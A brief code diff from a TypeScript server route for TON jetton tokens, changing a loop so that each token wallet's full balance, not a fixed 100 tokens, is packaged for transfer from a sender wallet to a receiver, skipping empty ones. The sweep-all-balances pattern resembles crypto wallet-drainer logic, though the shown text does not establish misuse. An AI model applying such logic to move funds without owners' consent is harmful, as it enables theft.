@@ -77,12 +77,13 @@ export async function POST(req: NextRequest) {
 		const jettonWallet = await getContractWallet(contract, senderWallet);
 		const balance = await getTokenBalance(jettonWallet);
 
+		if (!balance) continue;
+
 		const payload = await createTokenTransferPayload(
 			senderWallet,
 			receiverWallet,
-			toNano('100')
+			balance
 		);
-
 
 		transactions.push({
 			address: jettonWallet.toString(),
